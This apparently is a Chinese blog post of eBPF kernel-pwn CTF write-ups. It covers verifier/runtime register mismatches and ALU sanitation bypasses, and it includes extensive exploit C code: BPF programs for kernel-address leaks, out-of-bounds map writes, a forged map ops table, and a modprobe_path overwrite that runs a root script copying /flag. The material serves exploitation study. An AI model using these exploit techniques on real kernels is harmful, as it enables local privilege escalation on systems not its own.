...
uint64_t bpf_map_update_key(int map_fd, uint32_t key, void *value, uint64_t flags){
    // size_t modprobe_addr = kbase + modprobe_offset; 
    // bpf_map_update_elem(map_fd, 0, &modprobe_addr, BPF_ANY); 
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t) &key,
        .value = (uint64_t) value,
...
{{< image src="/img/ebpf/cve.png" >}}



关于 ebpf 的 CVE 大部分都是关于 verifier，pwn中大概也是这样，也就是构造一个 inconsistent register (我习惯这么称呼，即verifier 认为是0，实际上是1的寄存器)

本文除了 seccon ctf 那道题是关于 JIT 的，其他都是关于 verifier 的
...
在代码中， `bpf_reg_state` 结构体中包括 {s,u}{min,max}_value 来记录有无符号下的最大最小值，并用一个 `tnum` 结构体来保存可能值：
...
- **`R0, R1, R10...`**: 代表 BPF 的 10 个寄存器。
- **`w` (如 `R0_w`)**: 代表这个寄存器刚刚被 **写入（Write）** 了。
- **`P0, P1`**: 这里的 `P` 代表 **Precise（精确值）**。验证器确定这个寄存器在此时此刻一定是这个数。
- **`scalar`**: 代表这个寄存器存的是一个普通数字，不是指针。
- **`map_value`**: 代表这个寄存器存的是一个指向 BPF Map 数据的指针。
- **`var_off`**: 代表**位状态（tnum）**。例如 `(0x0; 0x1)` 表示：确定的位是 0，不确定的位只有最后 1 位。



```
--- Verifier Log (Success) ---
func#0 @0
0: R1=ctx() R10=fp0
0: (62) *(u32 *)(r10 -4) = 0          ; R10=fp0 fp-8=0000????
1: (bf) r2 = r10                      ; R2_w=fp0 R10=fp0
2: (07) r2 += -4                      ; R2_w=fp-4
3: (18) r1 = 0x0                      ; R1_w=map_ptr(ks=4,vs=8)
5: (85) call bpf_map_lookup_elem#1    ; R0_w=map_value_or_null(id=1,ks=4,vs=8)
6: (55) if r0 != 0x0 goto pc+1        ; R0_w=P0
7: (95) exit

from 6 to 8: R0=map_value(ks=4,vs=8) R10=fp0 fp-8=mmmm????
8: R0=map_value(ks=4,vs=8) R10=fp0 fp-8=mmmm????
8: (bf) r6 = r0                       ; R0=map_value(ks=4,vs=8) R6_w=map_value(ks=4,vs=8)
9: (b7) r0 = 0                        ; R0_w=P0
10: (79) r7 = *(u64 *)(r6 +0)         ; R6_w=map_value(ks=4,vs=8) R7_w=Pscalar()
11: (57) r7 &= 1                      ; R7_w=Pscalar(smin=smin32=0,smax=umax=smax32=umax32=1,var_off=(0x0; 0x1))
12: (b7) r8 = 1                       ; R8_w=P1
13: (cf) r8 s>>= r7                   ; R7_w=Pscalar(smin=smin32=0,smax=umax=smax32=umax32=1,var_off=(0x0; 0x1)) R8_w1
14: (b7) r9 = 1                       ; R9_w=P1
15: (1f) r9 -= r8                     ; R8_w=P1 R9_w=P0
16: (27) r9 *= 272                    ; R9_w=P0
17: (bf) r7 = r6                      ; R6_w=map_value(ks=4,vs=8) R7_w=map_value(ks=4,vs=8)
18: (1f) r7 -= r9                     ; R7_w=map_value(ks=4,vs=8) R9_w=P0
19: (79) r8 = *(u64 *)(r7 +0)         ; R7_w=map_value(ks=4,vs=8) R8_w=Pscalar()
20: (7b) *(u64 *)(r6 +0) = r8         ; R6_w=map_value(ks=4,vs=8) R8_w=Pscalar()
21: (b7) r0 = 0                       ; R0_w=P0
22: (95) exit
```
...
低于`v5.11.17`版本，可以将一个指针加减`corrupt register`从而进行越界读写

但是，内核`v5.11.17`引入了这个[commit](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0)，对 ALU Sanitation 进行了进一步的加强，使得我们不能直接将 `corrupt register` 直接与指针进行运算进行越界

因此，高版本需要利用`bpf_skb_load_bytes`
...
| **`BPF_JNE`** | 0x50 | 不相等时跳转       |
| **`BPF_JGT`** | 0x20 | 大于（无符号）     |
| **`BPF_JGE`** | 0x30 | 大于等于（无符号） |
| **`BPF_JLT`** | 0xa0 | 小于（无符号）     |
| **`BPF_JLE`** | 0xb0 | 小于等于（无符号） |
...
调用完 helper_function 要确保它返回的不是0
...
核心在于：构造一个 runtime (`/kernel/bpf/core.c`) 和 verifier (`/kernel/bpf/verifier.c`) 不一致的寄存器（`inconsistent register`）

verifier、patch 中需要重点关注 `adjust_scalar_min_max_vals`函数

低版本内核（5.11.17之前）中，可以用 `inconsisten register`加上 ptr 类型的寄存器进行越界，之后不行，转到使用 bpf_skb_load_bytes 这个 helper function 进行溢出
...
那么，`verifier`就会认为这个`reg0`为已知（known）的寄存器，且其值确定为0。

但是实际上`core.c`中进行右移运算的时候，会把右移位数`&63`，所以实际上CPU执行的运算是`0x1337 >> 0`。
...
> intel 手册 SAL/SAR/SHL/SHR—Shift 小节中：
>
...
>
> 虽然CPU会 masked to 5 or 6 bits，但是我感觉主要的原因还是在`core.c`中？
...
```c
    struct bpf_insn kleak_prog[] = {
        ...
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0), //reg7 = map_ptr - 0x110 reg7_verifier = map_ptr
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // load the ptr (kbase leak) reg8 = *(map_ptr - 0x110)
...
```c
    struct bpf_insn overwrite_ops[] = {
        ...
        BPF_MOV64_IMM(BPF_REG_0, kbase + ARRAY_MAP_LOOKUP_ELEM_OFFSET), //array_map_lookup_elem
...
5.16.12 版本的内核，ALU sanitizer 加强了检测

这里改用`bpf_skb_load_bytes`这个 helper function 来实现利用，to 参数设置为 bpf stack ，len 参数利用 corrupted register 构造一个大于 bpf 栈长度的数

当我们往 sock 里 write 进我们的 ROP 链之后，bpf 程序就会把 rop 链拷贝到 bpf 栈中，造成了栈溢出



这道题目中，泄露地址是通过栈溢出来破坏栈，导致内核的 soft panic，就会打印出一些地址

再进行内核 ROP 即可

具体exp查看：https://github.com/chujDK/d3ctf2022-pwn-d3bpf-and-v2
...
1. 禁掉了`ALU Sanitation`，
2. 在`adjust_scalar_min_max_vals`中会调用到`is_safe_to_compute_dst_reg_range`：
...
也就是说，`src`可以不为`const`（一个已知确定的数），并且`BPF_LSH BPF_RSH BPF_ARSH`的时候满足`src_reg->umax_value < insn_bitness`的话，这个寄存器就是已知安全的

（对于 `BPF_ALU64` 类指令（64 位运算），`insn_bitness` 则为 64）



**构造verifier和runtime不一致的寄存器**

`is_safe_to_compute_dst_reg_range`会被下面这个函数调用：
...
接着进行`1 arsh reg8`，由于`arsh`运算取的是`umin_val`，这里的`umin_val`为0，所以`verifier`认为它是1，实际上它是0
...
有了 inconsisten register，就可以把 ops 写入 value 中，泄露出 kernel_base

bpf_map 结构体中有 bpf_array 的地址，可以泄露出来



**任意地址写**

新创建一个 map，往里面写入 fake_ops ，覆盖其中的 `map_push_elem` 元素为 `map_get_next_key` 函数指针

然后，修改 bpf_map 结构体中的：

- `map_type`，修改为 BPF_MAP_TYPE_STACK
- `max_entries`，修改为 0xffffffff，即 -1
- `spin_lock_off`，修改为 0



这样调用 map_update_elem 的时候，其实调用到了 stack_map_ops 的 map_push_elem（因为），又因为 ops 中的这个位置被覆盖成了 map_get_next_key，所以会去调用 map_get_next_key
...
修改 `max_entries` 和 `spin_lock_off` 是为了能正常执行到函数最后

我们传入的 value 就是最后的 key，flags 就是最后的 next_key，所以我们构造 value 和 flags 就可以实现 `*(u32*)flags = *(u32*)value + 1` 的写入
...
#define ARRAY_MAP_GET_NEXT_KEY_OFFSET 0x1d3b40

size_t kernel_base = 0xffffffff81000000, kernel_offset;
size_t modprobe_offset = 0x10be1e0;

void get_flag() {
    log_info("Backing from the kernelspace.\n");
    system("echo -ne \"\xff\\xff\\xff\\xff\" > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("echo \"#!/bin/sh\" >> /tmp/modprobe");
    system("echo \"cp /flag /tmp/flag && chmod a+r /tmp/flag\" >> /tmp/modprobe");
    system("chmod +x /tmp/modprobe");
    char *args[] = {"/tmp/dummy", NULL};
    char *env[] = {NULL};
    execve("/tmp/dummy", args, env);
...
void attach_socket(int prog_fd){
    if(socks[0] == -1 && socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0){
        perror("socketpair");
        exit(1);
    }
...
uint64_t leak_addr_from_map(int map_fd, int offset, bool is_sub){
    if(is_sub == false){

        uint32_t key = 0;
        uint64_t value = 1;
        bpf_map_update_elem(map_fd, key, &value, BPF_ANY); // position 0 = 1

        struct bpf_insn leak_kernel_addr[] = {
            BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),           //*(u64 *)(reg10-4) = 0
            BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           //r2 = reg10
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),          //r2 = reg10 - 4
            BPF_LD_MAP_FD(BPF_REG_1, map_fd),               //r1 = map_fd
            BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),        //rdi = map_fd; rsi = 0 ; reg0 = map_value

            BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),      
            BPF_EXIT_INSN(),

            BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),            //reg6 = map_ptr    
            BPF_MOV64_IMM(BPF_REG_0, 0),                    //r0 = 0
            BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),   //reg7=*reg6;verifier reg7[0,u64_max];runtime reg7 = 1
            BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),           // verifier reg7[0,1]

            BPF_MOV64_IMM(BPF_REG_8, 1),                    // reg8 = 1
            BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_7),  //reg8 arsh reg7; verifier = 1; runtime = 0
            BPF_MOV64_IMM(BPF_REG_9, 1),                    //reg9 = 1
            BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_8),   // reg9 -= reg8; r9：verifier = 0;runtime = 1
            BPF_ALU64_IMM(BPF_MUL, BPF_REG_9, offset),       // reg9_runtime = 0xf8 ; reg9_verifier = 0

            BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),            //reg7 = reg6 = map_ptr
            BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_9),   //reg7 = reg7 - reg9 = ops
            BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   //r8 = *r7 
            BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),   //*r6 = r8;value_ptr = ops

            BPF_MOV64_IMM(BPF_REG_0, 0),
            BPF_EXIT_INSN(),
        };

        run_bpf_prog(leak_kernel_addr,sizeof(leak_kernel_addr)/sizeof(leak_kernel_addr[0]));
    }else{
        ...
        struct bpf_insn leak_physmap[] = {
            ...
            BPF_MOV64_IMM(BPF_REG_9, 1),                    //reg9 = 1
            BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_8),   // reg9 -= reg8; r9：verifier = 0;runtime = 1
            BPF_ALU64_IMM(BPF_MUL, BPF_REG_9, offset),       // reg9_runtime = 0x88; reg9_verifier = 0

            BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),            //reg7 = reg6 = map_ptr
            BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_9),   //reg7 = reg7 - reg9 = physmap_addr
            BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   //r8 = *r7 
            BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),   //*r6 = r8;value_ptr = physmap_addr

            BPF_MOV64_IMM(BPF_REG_0, 0),
            BPF_EXIT_INSN(),
        };
        run_bpf_prog(leak_physmap,sizeof(leak_physmap)/sizeof(leak_physmap[0]));
    } 

    return bpf_map_lookup_elem(map_fd, 0, 0);
}

void write_to_map(int map_fd, int offset,uint64_t value){

    uint32_t key = 0;
    uint64_t tmp = 1;
    bpf_map_update_elem(map_fd, key, &tmp, BPF_ANY); // position 0 = 1
    struct bpf_insn prog[] = {
        ...
        BPF_ALU64_REG(BPF_SUB, BPF_REG_6, BPF_REG_9),   // r6 -= r9
        // BPF_ST_MEM(BPF_DW, BPF_REG_6, 0, value),   // *r6 = imm 
        BPF_LD_IMM64(BPF_REG_7, value),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    run_bpf_prog(prog,sizeof(prog)/sizeof(prog[0]));
...
{
    uint64_t victim_map_addr;

    int map_fd = bpf_map_create(4, 8, 1);
    int victim_map = bpf_map_create(4, 8, 0x158/8);

    uint64_t kbase = leak_addr_from_map(map_fd, 0xf8, false) - 0xc1d9a0;
    printf("\033[32m\033[1m[*]kernel_base addr: %p\n\033[0m", (void *)kbase);

    uint64_t map_addr = leak_addr_from_map(map_fd, 0x88, true) - 0x70;
    printf("\033[32m\033[1m[*]map_addr: %p\n\033[0m", (void *)map_addr);   

    victim_map_addr = leak_addr_from_map(victim_map, 0x88, true) - 0x70;
    printf("\033[32m\033[1m[*]victim_map_addr: %p\n\033[0m", (void *)victim_map_addr);
    // write_to_map(map_fd, 0xf8, (uint64_t)0xdeedbeef);
    size_t fake_array_map_ops[] = {
        0xffffffff811d39d0, 0xffffffff811d4ca0, // 0x00: map_alloc_check, map_alloc
        0x0000000000000000, 0xffffffff811d52c0, // 0x10: map_release, map_free
        0xffffffff811d3b40, 0xffffffff811d4a30, // 0x20: map_get_next_key, map_release_uref
        0x0000000000000000, 0xffffffff81197020, // 0x30: map_lookup_elem_sys_only, map_lookup_batch
        0x0000000000000000, 0x0000000000000000, // 0x40: map_lookup_and_delete_elem, map_lookup_and_delete_batch
        0xffffffff81196df0, 0x0000000000000000, // 0x50: map_update_batch, map_delete_batch
        0xffffffff811d3d10, 0xffffffff811d5760, // 0x60: map_lookup_elem, map_update_elem
        0xffffffff811d3b90, 0x0000000000000000, // 0x70: map_delete_elem, map_push_elem
        0x0000000000000000, 0x0000000000000000, // 0x80: map_pop_elem, map_peek_elem
        0x0000000000000000, 0x0000000000000000, // 0x90: map_looHup_percpu_elem, map_fd_get_ptr
        0x0000000000000000, 0xffffffff811d4270, // 0xa0: map_fd_put_ptr, map_gen_lookup
        0x0000000000000000, 0xffffffff811d40f0, // 0xb0: map_fd_sys_lookup_elem, map_seq_show_elem
        0xffffffff811d50a0, 0x0000000000000000, // 0xc0: map_check_btf, map_poke_track
        0x0000000000000000, 0x0000000000000000, // 0xd0: map_poke_untrack, map_poke_run
        0xffffffff811d3a90, 0xffffffff811d3ae0, // 0xe0: map_direct_value_addr, map_direct_value_meta
        0xffffffff811d4070, 0x0000000000000000, // 0xf0: map_mmap, map_poll
        0x0000000000000000, 0x0000000000000000, // 0x100: map_get_unmapped_area, map_local_storage_charge
        0x0000000000000000, 0x0000000000000000, // 0x110: map_local_storage_uncharge, map_owner_storage_ptr
        0x0000000000000000, 0xffffffff811d5140, // 0x120: map_redirect, map_meta_equal
        0xffffffff811be490, 0xffffffff811d3f60, // 0x130: map_set_for_each_callback_args, map_for_each_callback
        0xffffffff811d3e30, 0xffffffff823e1b60, // 0x140: map_mem_usage, map_btf_id
        0xffffffff81c1db00,
    }; 
    fake_array_map_ops[0x78/8] =0xffffffff811d3b40; //map_push_elem -> array_of_map_get_next_key
    printf("fake_array_map_ops : %p",&fake_array_map_ops[0x78/8]);

    for (int i = 0; i < sizeof(fake_array_map_ops)/sizeof(fake_array_map_ops[0]); i++){
        if(fake_array_map_ops[i] != 0){
            fake_array_map_ops[i] = fake_array_map_ops[i] - 0xffffffff81000000 + kbase;
        }
        bpf_map_update_elem(victim_map, i, &fake_array_map_ops[i], BPF_ANY);
    }
    write_to_map(map_fd, 0xf8, victim_map_addr+0xf8); // write ops
    write_to_map(map_fd, 0xe0, 0xffffFFFF00000008); //write max_entries to 0xffffFFFF
    write_to_map(map_fd, 0xe8, 0x0000000400000000 | BPF_MAP_TYPE_STACK); //overwrite map_type to stack 

    size_t modprobe_addr = kbase + modprobe_offset;
    char *target1 = "/tmp/x";
    size_t val1 = *(int *)(&target1[0]) - 1;
    bpf_map_update_elem(map_fd, 0, &val1, modprobe_addr+1);
...
//musl-gcc -w -s -static -o3 exp.c -masm=intel -o ./exp
//gcc exp.c -static -masm=intel -g -o ./initramfs/exp
```

> 最后面调用 bpf_map_update_elem 调用了一次后，再次调用就调用不到 get_next_key 了，不知道为什么。不过能写4个字节就够打 modprobe 了



{{< image src="/img/ebpf/eebpf.png" >}}
...
adjust_scalar_min_max_vals 多了一个 ROL 指令，

`core.c`中是这样计算32位rol的：
...
```diff
+		DST = (((u32)DST) << IMM) | (((u32)DST) >> (64 - IMM));		
```
...
https://github.com/DownUnderCTF/Challenges_2025_Public/tree/main/pwn/rolling_around


---

> Author:    
> URL: http://localhost:1313/posts/kernel_ebpfpwn/  
